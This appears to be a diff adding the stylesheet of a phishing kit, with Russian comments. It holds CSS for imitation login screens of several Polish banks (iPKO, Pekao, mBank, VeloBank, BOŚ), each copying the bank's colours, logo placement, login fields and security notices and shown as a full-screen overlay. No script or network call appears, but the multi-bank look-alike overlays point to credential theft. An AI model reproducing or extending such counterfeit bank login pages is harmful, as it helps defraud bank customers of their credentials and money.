@@ -1,0 +1,1114 @@
+/* ============================================================
+   ПОЛНЫЙ CSS — ВСЕ БАНКИ (1–6)
+   ============================================================ */
+
+/* ---------- БАНК 1 — iPKO ---------- */
+.login-screen {
+    display: none;
+    background: #ffffff;
+    min-height: calc(100vh - 72px);
+    width: 100%;
+    padding: 40px 30px 30px;
+    position: relative;
+    z-index: 2;
+}
+
+.login-screen.visible {
+    display: block;
+}
+
+.login-screen .login-container {
+    max-width: 1000px;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+}
+
+.login-screen .login-grid {
+    display: flex;
+    gap: 60px;
+    align-items: flex-start;
+    width: 100%;
+}
+
+.login-screen .login-left {
+    flex: 1;
+    max-width: 480px;
+}
+
+.login-screen .login-right {
+    flex: 1;
+    max-width: 400px;
+    padding-top: 10px;
+}
+
+.login-screen .login-left .ipko-logo {
+    width: 75px;
+    height: 56px;
+    display: block;
+    margin-bottom: 12px;
+}
+
+.login-screen .login-left .ipko-logo img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    display: block;
+}
+
+.login-screen .login-title {
+    font-size: 28px;
+    font-weight: 400;
+    color: #1a1a1a;
+    margin-bottom: 4px;
+}
+
+.login-screen .login-subtitle {
+    font-size: 16px;
+    color: #555;
+    margin-bottom: 24px;
+}
+
+.login-screen .login-form .form-group {
+    margin-bottom: 16px;
+}
+
+.login-screen .login-form label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    color: #1a1a1a;
+    margin-bottom: 4px;
+}
+
+.login-screen .login-form input {
+    width: 100%;
+    padding: 10px 14px;
+    font-size: 14px;
+    border: 1px solid #d0d8e4;
+    border-radius: 4px;
+    background: #f8faff;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    font-family: inherit;
+}
+
+.login-screen .login-form input:focus {
+    border-color: #003b6f;
+    box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12);
+    outline: none;
+    background: #ffffff;
+}
+
+.login-screen .login-form .login-btn {
+    width: 135px;
+    height: 40px;
+    padding: 0 20px;
+    background: #0072b0;
+    color: #ffffff;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+    flex-shrink: 0;
+    white-space: nowrap;
+    margin-top: 6px;
+}
+
+.login-screen .login-form .login-btn:hover {
+    background: #005a8c;
+}
+
+.login-screen .login-form .login-btn-row {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+}
+
+.login-screen .login-form .login-btn-row .form-group {
+    flex: 1;
+    min-width: 180px;
+    margin-bottom: 0;
+}
+
+.login-screen .security-info {
+    border-left: 3px solid #003b6f;
+    padding-left: 28px;
+    height: 100%;
+}
+
+.login-screen .security-info .info-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 12px;
+}
+
+.login-screen .security-info p {
+    font-size: 15px;
+    color: #444;
+    margin-bottom: 8px;
+    line-height: 1.5;
+}
+
+.login-screen .security-info .highlight {
+    font-weight: 600;
+    color: #1a1a1a;
+}
+
+.login-screen .security-info .security-block {
+    margin-bottom: 16px;
+}
+
+.login-screen .security-info .security-block:last-child {
+    margin-bottom: 0;
+}
+
+.login-screen .contact-info {
+    border-left: 3px solid #0072b0;
+    padding-left: 28px;
+    height: 100%;
+}
+
+.login-screen .contact-info .info-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 16px;
+}
+
+.login-screen .contact-info .contact-block {
+    margin-bottom: 18px;
+}
+
+.login-screen .contact-info .contact-block:last-child {
+    margin-bottom: 0;
+}
+
+.login-screen .contact-info .contact-label {
+    font-weight: 600;
+    color: #1a1a1a;
+    font-size: 15px;
+    margin-bottom: 2px;
+}
+
+.login-screen .contact-info .contact-phone {
+    font-size: 18px;
+    font-weight: 700;
+    color: #0072b0;
+    letter-spacing: 0.5px;
+}
+
+.login-screen .contact-info .contact-phone-small {
+    font-size: 15px;
+    font-weight: 400;
+    color: #444;
+    margin-top: 2px;
+}
+
+.login-screen .contact-info .contact-divider {
+    border: none;
+    border-top: 1px solid #e6ebf3;
+    margin: 16px 0;
+}
+
+.login-screen .contact-info .contact-link {
+    color: #0072b0;
+    font-weight: 500;
+    font-size: 15px;
+    cursor: pointer;
+    transition: color 0.2s;
+}
+
+.login-screen .contact-info .contact-link:hover {
+    color: #005a8c;
+    text-decoration: underline;
+}
+
+/* ---------- БАНК 3 — PEKAO ---------- */
+.bank3-full-page {
+    display: none;
+    background: url('1234.jpg') center/cover no-repeat;
+    min-height: 100vh;
+    width: 100%;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+    overflow-y: auto;
+}
+
+.bank3-full-page.visible {
+    display: block;
+}
+
+.bank3-full-page::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.85);
+    z-index: 0;
+}
+
+.bank3-header {
+    width: 100%;
+    height: 56px;
+    background: #d71920;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    position: relative;
+    z-index: 2;
+}
+
+.bank3-header .bank3-header-content {
+    max-width: 1200px;
+    width: 100%;
+    padding: 0 40px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+}
+
+.bank3-header .bank3-header-content .bank3-logo {
+    display: block;
+    height: 32px;
+    width: auto;
+}
+
+.bank3-header .bank3-header-content .bank3-logo img {
+    height: 100%;
+    width: auto;
+    display: block;
+}
+
+.bank3-full-page .login-container {
+    position: relative;
+    z-index: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: calc(100vh - 56px);
+    padding: 40px 20px;
+}
+
+.bank3-full-page .login-form-wrapper {
+    background: #ffffff;
+    border: 3px solid #d71920;
+    border-radius: 16px;
+    padding: 24px 28px 28px;
+    max-width: 420px;
+    width: 100%;
+    margin: 0 auto;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.10);
+}
+
+.bank3-full-page .login-form-wrapper .login-title {
+    font-size: 28px;
+    font-weight: 400;
+    color: #1a1a1a;
+    margin-bottom: 4px;
+}
+
+.bank3-full-page .login-form-wrapper .login-subtitle {
+    font-size: 16px;
+    color: #555;
+    margin-bottom: 20px;
+}
+
+.bank3-full-page .login-form-wrapper .form-group {
+    margin-bottom: 16px;
+}
+
+.bank3-full-page .login-form-wrapper label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    color: #1a1a1a;
+    margin-bottom: 4px;
+}
+
+.bank3-full-page .login-form-wrapper input {
+    width: 100%;
+    padding: 10px 14px;
+    font-size: 14px;
+    border: 1px solid #d0d8e4;
+    border-radius: 4px;
+    background: #f8faff;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    font-family: inherit;
+}
+
+.bank3-full-page .login-form-wrapper input:focus {
+    border-color: #003b6f;
+    box-shadow: 0 0 0 3px rgba(0, 59, 111, 0.12);
+    outline: none;
+    background: #ffffff;
+}
+
+.bank3-full-page .login-form-wrapper .login-btn-row {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+    margin-top: 4px;
+}
+
+.bank3-full-page .login-form-wrapper .login-btn-row .form-group {
+    flex: 1;
+    min-width: 180px;
+    margin-bottom: 0;
+}
+
+.bank3-full-page .login-form-wrapper .login-btn {
+    width: 135px;
+    height: 40px;
+    padding: 0 20px;
+    background: #d71920;
+    color: #ffffff;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+    flex-shrink: 0;
+    white-space: nowrap;
+}
+
+.bank3-full-page .login-form-wrapper .login-btn:hover {
+    background: #b01218;
+}
+
+.bank3-full-page .login-form-wrapper .security-warnings {
+    margin-top: 24px;
+    border-top: 1px solid #e6ebf3;
+    padding-top: 18px;
+}
+
+.bank3-full-page .login-form-wrapper .security-warnings .warning-item {
+    font-size: 14px;
+    font-weight: 400;
+    color: #555;
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    line-height: 1.4;
+    margin-bottom: 8px;
+}
+
+.bank3-full-page .login-form-wrapper .security-warnings .warning-item:last-child {
+    margin-bottom: 0;
+}
+
+.bank3-full-page .login-form-wrapper .security-warnings .warning-item .icon {
+    font-size: 16px;
+    flex-shrink: 0;
+    margin-top: 1px;
+    color: #888;
+}
+
+.bank3-close-btn {
+    position: fixed;
+    top: 16px;
+    right: 20px;
+    z-index: 10000;
+    background: rgba(0, 0, 0, 0.3);
+    color: #fff;
+    border: none;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    font-size: 24px;
+    cursor: pointer;
+    transition: background 0.2s;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    line-height: 1;
+}
+
+.bank3-close-btn:hover {
+    background: rgba(0, 0, 0, 0.6);
+}
+
+.bank3-close-btn.visible {
+    display: flex;
+}
+
+/* ---------- БАНК 4 — mBank ---------- */
+.bank4-full-page {
+    display: none;
+    background: #f5f5f5;
+    min-height: 100vh;
+    width: 100%;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+    overflow-y: auto;
+}
+
+.bank4-full-page.visible {
+    display: block;
+}
+
+.bank4-full-page .bank4-container {
+    max-width: 500px;
+    margin: 0 auto;
+    padding: 60px 30px;
+}
+
+.bank4-full-page .bank4-title {
+    font-size: 32px;
+    font-weight: 300;
+    color: #000000;
+    margin-bottom: 4px;
+}
+
+.bank4-full-page .bank4-subtitle {
+    font-size: 16px;
+    color: #555;
+    margin-bottom: 30px;
+}
+
+.bank4-full-page .bank4-form .form-group {
+    margin-bottom: 16px;
+}
+
+.bank4-full-page .bank4-form label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    color: #000000;
+    margin-bottom: 4px;
+}
+
+.bank4-full-page .bank4-form input {
+    width: 100%;
+    padding: 12px 14px;
+    font-size: 14px;
+    border: 2px solid #cccccc;
+    border-radius: 0;
+    background: #ffffff;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    font-family: inherit;
+    color: #000000;
+}
+
+.bank4-full-page .bank4-form input:focus {
+    border-color: #888888;
+    box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.08);
+    outline: none;
+}
+
+.bank4-full-page .bank4-form input::placeholder {
+    color: #aaaaaa;
+}
+
+.bank4-full-page .bank4-form .login-btn-row {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+    margin-top: 4px;
+}
+
+.bank4-full-page .bank4-form .login-btn-row .form-group {
+    flex: 1;
+    min-width: 180px;
+    margin-bottom: 0;
+}
+
+.bank4-full-page .bank4-form .login-btn {
+    width: 135px;
+    height: 44px;
+    padding: 0 24px;
+    background: #000000;
+    color: #ffffff;
+    border: 2px solid #000000;
+    border-radius: 30px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s, color 0.2s;
+    flex-shrink: 0;
+    white-space: nowrap;
+}
+
+.bank4-full-page .bank4-form .login-btn:hover {
+    background: #333333;
+    border-color: #333333;
+}
+
+.bank4-full-page .bank4-close-btn {
+    position: fixed;
+    top: 16px;
+    right: 20px;
+    z-index: 10000;
+    background: rgba(0, 0, 0, 0.3);
+    color: #fff;
+    border: none;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    font-size: 24px;
+    cursor: pointer;
+    transition: background 0.2s;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    line-height: 1;
+}
+
+.bank4-full-page .bank4-close-btn:hover {
+    background: rgba(0, 0, 0, 0.6);
+}
+
+.bank4-full-page .bank4-close-btn.visible {
+    display: flex;
+}
+
+/* ---------- БАНК 5 — VeloBank ---------- */
+.bank5-full-page {
+    display: none;
+    background: #1a1a1a;
+    min-height: 100vh;
+    width: 100%;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+    overflow-y: auto;
+    align-items: center;
+    justify-content: center;
+}
+
+.bank5-full-page.visible {
+    display: flex;
+}
+
+.bank5-full-page .bank5-container {
+    max-width: 520px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+.bank5-full-page .bank5-box {
+    background: rgb(20, 20, 20);
+    border-radius: 16px;
+    padding: 40px 36px 36px;
+    width: 100%;
+    box-shadow: 0 8px 48px rgba(0, 0, 0, 0.6);
+}
+
+.bank5-full-page .bank5-alert {
+    background: rgba(255, 200, 50, 0.12);
+    border-left: 4px solid #f5a623;
+    padding: 14px 18px;
+    border-radius: 6px;
+    margin-bottom: 28px;
+    font-size: 13px;
+    color: #d0d0d0;
+    line-height: 1.5;
+}
+
+.bank5-full-page .bank5-alert a {
+    color: #f5a623;
+    font-weight: 500;
+    text-decoration: underline;
+    cursor: pointer;
+}
+
+.bank5-full-page .bank5-alert a:hover {
+    color: #ffc84d;
+}
+
+.bank5-full-page .bank5-title {
+    font-size: 24px;
+    font-weight: 600;
+    color: #ffffff;
+    margin-bottom: 4px;
+}
+
+.bank5-full-page .bank5-subtitle {
+    font-size: 15px;
+    color: #999999;
+    margin-bottom: 24px;
+}
+
+.bank5-full-page .bank5-form .form-group {
+    margin-bottom: 16px;
+}
+
+.bank5-full-page .bank5-form label {
+    display: block;
+    font-size: 14px;
+    font-weight: 500;
+    color: #cccccc;
+    margin-bottom: 4px;
+}
+
+.bank5-full-page .bank5-form input {
+    width: 100%;
+    padding: 12px 16px;
+    font-size: 14px;
+    border: 1px solid #3a3a3a;
+    border-radius: 8px;
+    background: #2a2a2a;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    font-family: inherit;
+    color: #ffffff;
+}
+
+.bank5-full-page .bank5-form input::placeholder {
+    color: #666666;
+}
+
+.bank5-full-page .bank5-form input:focus {
+    border-color: #26d655;
+    box-shadow: 0 0 0 3px rgba(38, 214, 85, 0.15);
+    outline: none;
+    background: #2a2a2a;
+}
+
+.bank5-full-page .bank5-form .login-btn-row {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    flex-wrap: wrap;
+    margin-top: 6px;
+}
+
+.bank5-full-page .bank5-form .login-btn-row .form-group {
+    flex: 1;
+    min-width: 180px;
+    margin-bottom: 0;
+}
+
+.bank5-full-page .bank5-form .login-btn {
+    width: 135px;
+    height: 48px;
+    padding: 0 28px;
+    background: rgb(38, 214, 85);
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.15s;
+    flex-shrink: 0;
+    white-space: nowrap;
+}
+
+.bank5-full-page .bank5-form .login-btn:hover {
+    background: #20c04a;
+    transform: scale(1.02);
+}
+
+.bank5-full-page .bank5-form .login-btn:active {
+    transform: scale(0.97);
+}
+
+.bank5-full-page .bank5-close-btn {
+    position: fixed;
+    top: 16px;
+    right: 20px;
+    z-index: 10000;
+    background: rgba(255, 255, 255, 0.1);
+    color: #ffffff;
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    font-size: 20px;
+    cursor: pointer;
+    transition: background 0.2s;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    line-height: 1;
+}
+
+.bank5-full-page .bank5-close-btn:hover {
+    background: rgba(255, 255, 255, 0.2);
+}
+
+.bank5-full-page .bank5-close-btn.visible {
+    display: flex;
+}
+
+/* ---------- БАНК 6 — BOŚ ---------- */
+.bank6-full-page {
+    display: none;
+    background: #f0f4f8;
+    min-height: 100vh;
+    width: 100%;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+    overflow-y: auto;
+    align-items: center;
+    justify-content: center;
+}
+
+.bank6-full-page.visible {
+    display: flex;
+}
+
+.bank6-container {
+    max-width: 1000px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 40px 30px;
+    display: flex;
+    gap: 50px;
+    align-items: flex-start;
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 8px 48px rgba(0, 0, 0, 0.08);
+    border: 1px solid #e6ebf3;
+}
+
+.bank6-left {
+    flex: 1;
+    max-width: 420px;
+}
+
+.bank6-title {
+    font-size: 28px;
+    font-weight: 600;
+    color: #1a1a1a;
+    margin-bottom: 24px;
+}
+
+.bank6-form .form-group {
+    margin-bottom: 18px;
+}
+
+.bank6-form label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    color: #1a1a1a;
+    margin-bottom: 4px;
+}
+
+.bank6-form input {
+    width: 100%;
+    padding: 12px 16px;
+    font-size: 14px;
+    border: 1px solid #d0d8e4;
+    border-radius: 8px;
+    background: #ffffff;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    font-family: inherit;
+    color: #1a1a1a;
+}
+
+.bank6-form input:focus {
+    border-color: #005f42;
+    box-shadow: 0 0 0 3px rgba(0, 95, 66, 0.12);
+    outline: none;
+}
+
+.bank6-form input::placeholder {
+    color: #999;
+}
+
+.bank6-form .login-btn {
+    width: 100%;
+    padding: 14px;
+    background: #005f42;
+    color: #ffffff;
+    border: none;
+    border-radius: 30px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.15s;
+    margin-top: 6px;
+}
+
+.bank6-form .login-btn:hover {
+    background: #004d35;
+    transform: scale(1.01);
+}
+
+.bank6-download {
+    margin-top: 16px;
+    text-align: center;
+}
+
+.bank6-download img {
+    width: 200px;
+    height: 44px;
+    object-fit: contain;
+    display: inline-block;
+}
+
+.bank6-right {
+    flex: 1;
+    max-width: 460px;
+    padding-top: 4px;
+}
+
+.bank6-security-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 16px;
+}
+
+.bank6-security-text {
+    font-size: 14px;
+    color: #444;
+    line-height: 1.6;
+}
+
+.bank6-security-text p {
+    margin-bottom: 10px;
+}
+
+.bank6-security-text .highlight {
+    font-weight: 600;
+    color: #1a1a1a;
+}
+
+.bank6-security-text .green {
+    color: #005f42;
+    font-weight: 600;
+}
+
+.bank6-security-text ul {
+    list-style: none;
+    padding: 0;
+    margin: 8px 0 12px;
+}
+
+.bank6-security-text ul li {
+    padding: 4px 0 4px 20px;
+    position: relative;
+}
+
+.bank6-security-text ul li::before {
+    content: '•';
+    position: absolute;
+    left: 0;
+    color: #005f42;
+    font-weight: 700;
+}
+
+.bank6-security-text .link {
+    color: #005f42;
+    font-weight: 600;
+    text-decoration: underline;
+    cursor: pointer;
+}
+
+.bank6-security-text .link:hover {
+    color: #004d35;
+}
+
+.bank6-close-btn {
+    position: fixed;
+    top: 16px;
+    right: 20px;
+    z-index: 10000;
+    background: rgba(0, 0, 0, 0.3);
+    color: #fff;
+    border: none;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    font-size: 24px;
+    cursor: pointer;
+    transition: background 0.2s;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    line-height: 1;
+}
+
+.bank6-close-btn:hover {
+    background: rgba(0, 0, 0, 0.6);
+}
+
+.bank6-close-btn.visible {
+    display: flex;
+}
+
+/* ---------- АДАПТИВНОСТЬ БАНКОВ ---------- */
+@media (max-width: 992px) {
+    .login-screen .login-grid {
+        flex-direction: column;
+        gap: 30px;
+    }
+    .login-screen .login-left {
+        max-width: 100%;
+        width: 100%;
+    }
+    .login-screen .login-right {
+        max-width: 100%;
+        width: 100%;
+        padding-top: 0;
+        border-top: 1px solid #e6ebf3;
+        padding-top: 24px;
+    }
+    .login-screen .security-info,
+    .login-screen .contact-info {
+        border-left: none;
+        padding-left: 0;
+    }
+    .login-screen .login-form .login-btn-row {
+        flex-direction: column;
+        align-items: stretch;
+    }
+    .login-screen .login-form .login-btn {
+        width: 100%;
+        height: 44px;
+    }
+    .bank3-full-page .login-form-wrapper {
+        max-width: 100%;
+        padding: 20px;
+    }
+    .bank3-full-page .login-form-wrapper .login-btn-row {
+        flex-direction: column;
+        align-items: stretch;
+    }
+    .bank3-full-page .login-form-wrapper .login-btn {
+        width: 100%;
+        height: 44px;
+    }
+    .bank4-full-page .bank4-form .login-btn-row {
+        flex-direction: column;
+        align-items: stretch;
+    }
+    .bank4-full-page .bank4-form .login-btn {
+        width: 100%;
+        height: 44px;
+    }
+    .bank5-full-page .bank5-form .login-btn-row {
+        flex-direction: column;
+        align-items: stretch;
+    }
+    .bank5-full-page .bank5-form .login-btn {
+        width: 100%;
+        height: 44px;
+    }
+    .bank6-container {
+        flex-direction: column;
+        max-width: 500px;
+        padding: 30px 24px;
+        gap: 30px;
+    }
+    .bank6-left {
+        max-width: 100%;
+    }
+    .bank6-right {
+        max-width: 100%;
+    }
+}
+
+@media (max-width: 768px) {
+    .login-screen .login-title {
+        font-size: 22px;
+    }
+    .bank3-full-page .login-form-wrapper .login-title {
+        font-size: 22px;
+    }
+    .bank4-full-page .bank4-title {
+        font-size: 24px;
+    }
+    .bank5-full-page .bank5-title {
+        font-size: 20px;
+    }
+    .bank6-title {
+        font-size: 22px;
+    }
+    .bank6-container {
+        padding: 24px 18px;
+        margin: 10px;
+    }
+    .bank6-download img {
+        width: 160px;
+        height: 36px;
+    }
+}
+
+@media (max-width: 480px) {
+    .login-screen .login-title {
+        font-size: 20px;
+    }
+    .login-screen .login-form input {
+        padding: 8px 10px;
+        font-size: 12px;
+    }
+    .login-screen .login-form .login-btn {
+        height: 36px;
+        font-size: 13px;
+    }
+    .bank3-full-page .login-form-wrapper .login-title {
+        font-size: 20px;
+    }
+    .bank3-full-page .login-form-wrapper input {
+        padding: 8px 10px;
+        font-size: 12px;
+    }
+    .bank3-full-page .login-form-wrapper .login-btn {
+        height: 36px;
+        font-size: 13px;
+        width: 100%;
+    }
+    .bank4-full-page .bank4-title {
+        font-size: 20px;
+    }
+    .bank4-full-page .bank4-form input {
+        padding: 8px 10px;
+        font-size: 12px;
+    }
+    .bank4-full-page .bank4-form .login-btn {
+        height: 36px;
+        font-size: 13px;
+        width: 100%;
+    }
+    .bank5-full-page .bank5-title {
+        font-size: 18px;
+    }
+    .bank5-full-page .bank5-form input {
+        padding: 8px 10px;
+        font-size: 12px;
+    }
+    .bank5-full-page .bank5-form .login-btn {
+        height: 36px;
+        font-size: 13px;
+        width: 100%;
+    }
+    .bank6-title {
+        font-size: 20px;
+    }
+    .bank6-form input {
+        padding: 8px 12px;
+        font-size: 12px;
+    }
+    .bank6-form .login-btn {
+        padding: 10px;
+        font-size: 13px;
+    }
+    .bank6-download img {
+        width: 140px;
+        height: 32px;
+    }
+    .bank6-container {
+        padding: 18px 14px;
+    }
+}
